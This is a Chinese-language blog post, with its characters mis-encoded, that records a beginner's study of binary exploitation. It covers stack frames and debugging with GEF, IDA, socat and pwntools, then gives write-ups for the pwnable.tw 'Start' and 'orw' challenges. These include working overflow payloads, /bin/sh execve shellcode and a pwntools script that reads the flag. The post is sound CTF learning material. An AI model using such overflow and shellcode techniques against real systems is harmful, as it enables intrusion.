<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <link rel="manifest" href="/images/manifest.json">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-flat-top.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ikoct.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="è®°å½•ä¸€ä¸‹å…¥é—¨Pwnçš„å¿ƒè·¯å†ç¨‹">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwnå­¦ä¹ è®°å½•">
<meta property="og:url" content="https://ikoct.com/2024/05/22/Pwn%E5%85%A5%E9%97%A8/">
<meta property="og:site_name" content="Ikoctçš„é¥®ğŸ§Šå®¤">
<meta property="og:description" content="è®°å½•ä¸€ä¸‹å…¥é—¨Pwnçš„å¿ƒè·¯å†ç¨‹">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-130646.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131047.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131106.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/03/20240603-232932.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-150927.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-151130.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-153801.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-103602.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113408.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113611.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-202523.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-203101.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F27%2F20241027-223034.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F28%2F20241028-143737.png">
<meta property="article:published_time" content="2024-05-22T12:44:16.000Z">
<meta property="article:modified_time" content="2024-11-11T14:06:04.921Z">
<meta property="article:author" content="1K0CT B14s">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-130646.png">

<link rel="canonical" href="https://ikoct.com/2024/05/22/Pwn%E5%85%A5%E9%97%A8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Pwnå­¦ä¹ è®°å½• | Ikoctçš„é¥®ğŸ§Šå®¤</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ikoctçš„é¥®ğŸ§Šå®¤</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ikoct.com/2024/05/22/Pwn%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/myavatar.gif">
      <meta itemprop="name" content="1K0CT B14s">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ikoctçš„é¥®ğŸ§Šå®¤">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Pwnå­¦ä¹ è®°å½•
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2024-05-22 20:44:16" itemprop="dateCreated datePublished" datetime="2024-05-22T20:44:16+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-11-11 22:06:04" itemprop="dateModified" datetime="2024-11-11T22:06:04+08:00">2024-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">äºŒè¿›åˆ¶</span></a>
                </span>
                  ï¼Œ
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>21 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>è®°å½•ä¸€ä¸‹å…¥é—¨Pwnçš„å¿ƒè·¯å†ç¨‹</p>
<span id="more"></span>

<h1 id="é›¶ç¢çŸ¥è¯†"><a href="#é›¶ç¢çŸ¥è¯†" class="headerlink" title="é›¶ç¢çŸ¥è¯†"></a>é›¶ç¢çŸ¥è¯†</h1><h2 id="æ ˆå¸§ç»“æ„"><a href="#æ ˆå¸§ç»“æ„" class="headerlink" title="æ ˆå¸§ç»“æ„"></a>æ ˆå¸§ç»“æ„</h2><p>åªæè¿°æ–¹ä¾¿æˆ‘è‡ªå·±ç†è§£çš„ ä¸ä¸€å®šæ ‡å‡†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">high</span><br><span class="line"> â†‘</span><br><span class="line">     ...</span><br><span class="line">    Caller&#x27;s rbp</span><br><span class="line">    (Callee&#x27;s Registers)</span><br><span class="line">    Buf(Local variables)</span><br><span class="line">    Return Addr</span><br><span class="line"> â†“</span><br><span class="line">low</span><br></pre></td></tr></table></figure>

<p><code>call func</code>æŒ‡ä»¤æ‰§è¡Œæ—¶ä¼šå…ˆå°†callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤pushå…¥æ ˆ é€€å‡ºå‡½æ•°æ—¶ä¿è¯å †æ ˆå¹³è¡¡å³rspæ¢å¤åˆ°è°ƒç”¨ç¨‹åºå‰ä¸€è¡Œçš„çŠ¶æ€ å‡½æ•°ç»“æŸå‰é€šè¿‡leaveæˆ–ç›´æ¥<code>add rsp, xxx</code>æ¥è¾¾åˆ°å †æ ˆå¹³è¡¡</p>
<h2 id="GEFå¸¸ç”¨æŒ‡ä»¤"><a href="#GEFå¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="GEFå¸¸ç”¨æŒ‡ä»¤"></a>GEFå¸¸ç”¨æŒ‡ä»¤</h2><h3 id="telescope-dereference-register"><a href="#telescope-dereference-register" class="headerlink" title="telescope | dereference [register]"></a>telescope | dereference [register]</h3><p>é€’å½’åœ°è§£å¼•ç”¨æŸå¯„å­˜å™¨æ‰€å«åœ°å€</p>
<h3 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h3><p>pattern creat [lenth]</p>
<p>åˆ›å»ºé•¿åº¦ä¸ºlenthçš„è´Ÿè½½ è´Ÿè½½çš„å½¢å¼å¯ä»¥æ­é…ä¸‹ä¸€ä¸ªæŒ‡ä»¤è¿›è¡Œæ ˆæº¢å‡ºé•¿åº¦çš„è®¡ç®—</p>
<p>pattern search [register]</p>
<p>æŸ¥æ‰¾åˆ›å»ºçš„è´Ÿè½½ä¸­å“ª4&#x2F;8å­—èŠ‚(æ ¹æ®ç¨‹åºçš„å¹³å°)ä¸ç›®æ ‡å¯„å­˜å™¨ä¸­çš„ç›¸åŒ ä»¥æ­¤å¯ä»¥é€šè¿‡ä¼ å…¥<code>$rsp</code>è®¡ç®—æ ˆæº¢å‡ºé•¿åº¦</p>
<h2 id="IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•"><a href="#IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•" class="headerlink" title="IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•"></a>IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•</h2><p>å› ä¸ºæ­£å¸¸IDAå¯åŠ¨ç¨‹åºæ— æ³•è¾“å…¥ä¸å¯æ‰“å°å­—ç¬¦ æ‰€ä»¥éœ€è¦é…åˆpwntoolså‘é€æ•°æ® å®ç°è¿™ä¸ªåŠŸèƒ½çš„å…·ä½“æ­¥éª¤:</p>
<p>1.ç”¨socatè¿›è¡Œç«¯å£è½¬å‘</p>
<p><code>socat TCP-LISTEN:19961,reuseaddr,fork EXEC:./Program_to_debug,pty,raw,echo=0</code></p>
<p>æ‰§è¡ŒæŒ‡ä»¤å<code>Program_to_debug</code>ä¼šç«‹å³å¯åŠ¨å¹¶ç›‘å¬æœ¬æœº<code>19961</code>ç«¯å£</p>
<p>å†™ä¸€ä¸ªshellè„šæœ¬ç®€åŒ–ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 2 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;program&gt; &lt;port&gt;&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">port=<span class="variable">$2</span></span><br><span class="line">path=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">exec</span> socat TCP-LISTEN:<span class="variable">$port</span>,reuseaddr,fork EXEC:<span class="variable">$path</span>,pty,raw,<span class="built_in">echo</span>=0</span><br></pre></td></tr></table></figure>



<p>2.ç”¨pwntoolsé™„åŠ åˆ°ç¨‹åº</p>
<p>Pythonä¸­å¯¼å…¥pwnåä½¿ç”¨<code>io = remote(&#39;127.0.0.1&#39;, 19961)</code>æ¥å»ºç«‹å’Œç¨‹åºçš„é“¾æ¥ æ­¤æ—¶å¯ä»¥ä½¿ç”¨<code>io.send()</code>æ¥å‘é€æ•°æ®</p>
<p>3.ç”¨IDAé™„åŠ åˆ°ç¨‹åº</p>
<p><code>Debugger</code>é€‰é¡¹å¡ä¸­é€‰æ‹©è¿œç«¯è°ƒè¯•-&gt;é™„åŠ åˆ°ç¨‹åºå°±èƒ½çœ‹åˆ°åˆšåˆšå¯ç”¨çš„çš„å¾…è°ƒè¯•ç¨‹åº:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-130646.png" alt="image-20240528130639443"></p>
<p>æ³¨æ„äº‹é¡¹:</p>
<p>è¿è¡Œç¨‹åºå‰è¦å…ˆåœ¨æƒ³è¦åœä¸‹çš„åœ°æ–¹ä¸‹å¥½æ–­ç‚¹ è¿è¡Œèµ·æ¥åIDAç›´æ¥F9è¿è¡Œ è¿™æ—¶å€™ç¨‹åºä¼šè¿è¡Œåˆ°ç¬¬ä¸€ä¸ªè¾“å…¥å¤„ ä¸€èˆ¬åœ¨è¾“å…¥åä¸‹æ–­ç‚¹å¹¶åœ¨Pythonç»ˆç«¯ä¸­å‘ç¨‹åºå‘é€æ•°æ® å‘é€å®Œæ•°æ®åç¨‹åºå°±ä¼šæ–­åœ¨åˆšåˆšä¸‹å¥½çš„æ–­ç‚¹å¤„</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131047.png" alt="image-20240528131047508"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131106.png" alt="image-20240528131106868"></p>
<h1 id="åˆ·é¢˜è®°å½•"><a href="#åˆ·é¢˜è®°å½•" class="headerlink" title="åˆ·é¢˜è®°å½•"></a>åˆ·é¢˜è®°å½•</h1><h2 id="Pwnable-tw-Start-stackoverflow-ret2shellcode"><a href="#Pwnable-tw-Start-stackoverflow-ret2shellcode" class="headerlink" title="Pwnable.tw-Start | stackoverflow | ret2shellcode"></a>Pwnable.tw-Start | stackoverflow | ret2shellcode</h2><p>é¢˜ç›®ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶å¾ˆç®€å• ç›´æ¥ç”¨ç³»ç»Ÿè°ƒç”¨æ¥è¾“å‡ºæç¤ºå’Œè¾“å…¥ ç„¶å<code>_exit</code>é€€å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 54                            push    esp</span><br><span class="line">.text:08048061 68 9D 80 04 08                push    offset _exit</span><br><span class="line">.text:08048066 31 C0                         xor     eax, eax</span><br><span class="line">.text:08048068 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:0804806A 31 C9                         xor     ecx, ecx</span><br><span class="line">.text:0804806C 31 D2                         xor     edx, edx</span><br><span class="line">.text:0804806E 68 43 54 46 3A                push    3A465443h</span><br><span class="line">.text:08048073 68 74 68 65 20                push    20656874h</span><br><span class="line">.text:08048078 68 61 72 74 20                push    20747261h</span><br><span class="line">.text:0804807D 68 73 20 73 74                push    74732073h</span><br><span class="line">.text:08048082 68 4C 65 74 27                push    2774654Ch</span><br><span class="line">.text:08048087 89 E1                         mov     ecx, esp                        ; addr</span><br><span class="line">.text:08048089 B2 14                         mov     dl, 14h                         ; len</span><br><span class="line">.text:0804808B B3 01                         mov     bl, 1                           ; fd</span><br><span class="line">.text:0804808D B0 04                         mov     al, 4</span><br><span class="line">.text:0804808F CD 80                         int     80h                             ; LINUX - sys_write</span><br><span class="line">.text:0804808F</span><br><span class="line">.text:08048091 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:08048093 B2 3C                         mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095 B0 03                         mov     al, 3</span><br><span class="line">.text:08048097 CD 80                         int     80h                             ; LINUX -</span><br><span class="line">.text:08048097</span><br><span class="line">.text:08048099 83 C4 14                      add     esp, 14h</span><br><span class="line">.text:0804809C C3                            retn</span><br><span class="line">.text:0804809C</span><br><span class="line">.text:0804809C                               _start endp ; sp-analysis failed</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; Attributes: noreturn</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; void exit(int status)</span><br><span class="line">.text:0804809D                               _exit proc near                         ; DATA XREF: _start+1â†‘o</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               status= dword ptr  4</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D 5C                            pop     esp</span><br><span class="line">.text:0804809E 31 C0                         xor     eax, eax</span><br><span class="line">.text:080480A0 40                            inc     eax</span><br><span class="line">.text:080480A1 CD 80                         int     80h</span><br></pre></td></tr></table></figure>

<p><code>checksec</code>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å…¨å…³ <code>vmmap</code>å‘ç°æ ˆå¯å†™å¯æ‰§è¡Œ ç”¨gdbè°ƒè¯•ä¸€ä¸‹å¯ä»¥å‘ç°æœ‰æ ˆæº¢å‡º<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png" alt="image-20240522194534063"></p>
<p>å¹¶ä¸”è¿”å›åœ°å€è·ç¦»è¾“å…¥ç¼“å†²åŒºèµ·ç‚¹20bytes å¯¹åº”<code>ret</code>å‰çš„<code>add esp, 0x14</code> ä½†æ˜¯ä¸€æ¬¡è¾“å…¥å³ä½¿ä¿®æ”¹è¿”å›åœ°å€ä¹Ÿæ²¡æœ‰ç°æˆçš„æ¼æ´å¯ä»¥åˆ©ç”¨ æ‰€ä»¥åˆ©ç”¨æ ˆå¯æ‰§è¡Œæ¥çœ‹çœ‹èƒ½ä¸èƒ½ret2shellcode æ€è·¯æ˜¯<code>ret</code>æŒ‡ä»¤æ‰§è¡ŒåespæŒ‡å‘è‡ªå·±å½“å‰çš„åœ°å€ è¿™æ—¶å€™å†è¿›è¡Œç³»ç»Ÿè°ƒç”¨å°±ä¼šæ³„éœ²espå†…å®¹ æ‰€ä»¥ç¬¬ä¸€ä¸ªpayloadå¯ä»¥è¿™æ ·å†™:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>]</span><br><span class="line">sh = process([<span class="string">&quot;./start&quot;</span>])</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(ret)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">esp = u32(sh.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>è‡³äºsendå’Œsendlineçš„åŒºåˆ«å€Ÿç”¨ä¸€ä¸‹è¿™ä½å¸ˆå‚…çš„<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/9fda4edb.html?highlight=pwntools">è®²è§£</a> æ€»ä¹‹<code>sys-read</code>ä¼šå°†<code>\n</code>è¯»åˆ°æ ˆä¸Š æ‰€ä»¥ç”¨send</p>
<p>ä¸‹ä¸€æ­¥å°±æ˜¯è¿”å›åˆ°shellcodeä¸Š ä»<code>add esp, 0x14</code> å¯ä»¥çŸ¥é“è¿”å›åœ°å€è¿˜æ˜¯è·ç¦»ç¼“å†²åŒºèµ·ç‚¹20bytes è¿™æ„å‘³ç€shellcodeé•¿åº¦éœ€è¦åœ¨20bytesä»¥å†… å¯ä»¥åœ¨<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/index.html">è¿™ä¸ªç½‘ç«™</a>æ‰¾åˆé€‚çš„shellcodeæˆ–è€…ç­‰ä»¥åæˆ‘èƒ½åŠ›å¤Ÿäº†è‡ªå·±å†™( æ‰€ä»¥ç¬¬äºŒä¸ªpayloadå¯ä»¥è¿™æ ·å†™:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>æœ€åæ‹¿åˆ°flag</p>
<h2 id="Pwnable-tw-orw-shellcode"><a href="#Pwnable-tw-orw-shellcode" class="headerlink" title="Pwnable.tw-orw | shellcode"></a>Pwnable.tw-orw | shellcode</h2><p>é¢˜ç›®æè¿°åªèƒ½ä½¿ç”¨<code>open</code> <code>read</code> <code>write</code>ç³»ç»Ÿè°ƒç”¨ flagç›®å½•åœ¨<code>/home/orw/flag</code> ç¨‹åºæ²¡æœ‰å¯¹è¾“å…¥æœ‰ä»»ä½•è¿‡æ»¤ å¯¹è¾“å…¥çš„é•¿åº¦ä¹Ÿå‡ ä¹æ²¡æœ‰é™åˆ¶ å¯ä»¥ç›´æ¥ç”¨pwntoolsçš„shellcraftæ„é€ shellcode <a target="_blank" rel="noopener" href="https://filippo.io/linux-syscall-table/">è¿™ä¸ªç½‘ç«™</a>å¯ä»¥æŸ¥åˆ°linuxç³»ç»Ÿè°ƒç”¨çº¦å®š</p>
<p>æŸ¥åˆ°<code>open</code>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–‡ä»¶è·¯å¾„ ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¯»å†™æ ‡å¿—ä½ è¿”å›çš„æ–‡ä»¶æŒ‡é’ˆæŒ‰ç…§i86è°ƒç”¨çº¦å®šå­˜æ”¾åœ¨<code>EAX</code>ä¸­ ç„¶åå†ç”¨<code>read</code>è¯»å–æ–‡ä»¶å¹¶å°†å…¶å­˜æ”¾åˆ°ä¸€ä¸ªç¼“å†²åŒºä¸­ æœ€åç”¨<code>write</code>æŒ‡å®šæ ‡å‡†è¾“å‡ºæµä¸ºæ–‡ä»¶æŒ‡é’ˆå°†ç¼“å†²åŒºçš„å†…å®¹å†™åˆ°è¾“å‡ºæµä¸­:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>, <span class="number">0</span>)    //ä»¥READ_ONLY(<span class="number">0</span>)æ ‡å¿—ä½æ‰“å¼€æ–‡ä»¶</span><br><span class="line">shellcode += shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)    //ä»¥espä½œä¸ºç¼“å†²åŒºæŒ‡é’ˆ è¯»å–<span class="number">100</span>å­—èŠ‚</span><br><span class="line">shellcode += shellcraft.i386.linux.write(<span class="number">1</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)        //<span class="number">1</span>ä¸ºæ ‡å‡†è¾“å‡ºæµ</span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(sh.recv(<span class="number">100</span>))</span><br></pre></td></tr></table></figure>

